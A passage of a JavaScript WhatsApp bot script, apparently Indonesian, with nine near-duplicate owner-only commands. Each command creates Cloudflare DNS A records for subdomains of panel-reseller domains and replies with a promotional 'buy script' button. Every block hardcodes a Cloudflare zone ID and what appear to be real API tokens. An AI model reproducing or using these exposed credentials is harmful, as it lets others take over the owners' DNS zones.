        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
 case 'd61': {
 
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "5d00f56aee3afd9cc4e0666bc8f23746";
    let apitoken = "mjR4BdiOo6aFO3uPl8BTgZIgOMH3asLbgVsOpEfO";
    let tld = "kedai-panel.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
           
           case 'd2': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a476ffcf9243c44a02220f184da527e8";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ";
               let tld = "mypanell.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
           
           case 'd3': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f374d347f22dc1b0ac208973f185c1f2";
               let apitoken = "m7Xe_0qhlv8enPURlO7UYRSR1-3C7u-uOUkZtvZa";
               let tld = "piwzstoreee.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
           
  case 'd4': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c1812c92fb249258e67a28573ca34344";
               let apitoken = "mqAjTHuT_GsaZsWcIjbllV-rrrtJHwyVxVeYlL1A";
               let tld = "piwzpediaaa.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break       
  
  case 'd5': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3cea2e71ec2bc82ea7865da5999d04b1";
               let apitoken = "eyOrW0eUPe0VxhQzzubXhY1w8X_Z120crfqpsNwL";
               let tld = "piwzpanel.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break         
           
 case 'd6': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c2c8ddf4f1bfd0d0c11eb0ed83a634f9";
               let apitoken = "RHmElwWM5pEb3HsWi82uramdhi9wzDsaU8F9JV6F";
               let tld = "r0ulxye4.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break                                                                               
 
 case 'd7': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "7432f024eeeaa0367fd985a18b2729cc";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ";
               let tld = "lanzpanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break  
                                                 
  case 'd8': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "891a2e5d4ac5b3db4fbcef8d9088ad38";
               let apitoken = "V2BCJ-jhHXQlkN5-_Jv-CuXEtJbLT9fo7NWAlMK2";
               let tld = "cpanel-vip.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
           
                                               case 'd9': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5f4a582dd80c518fb2c7a425256fb491";
               let apitoken = "iQbJQgfe6kTyEfdOy_EV8UAHKj80VgQg4t6rTjby"
               let tld = "tokopanellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
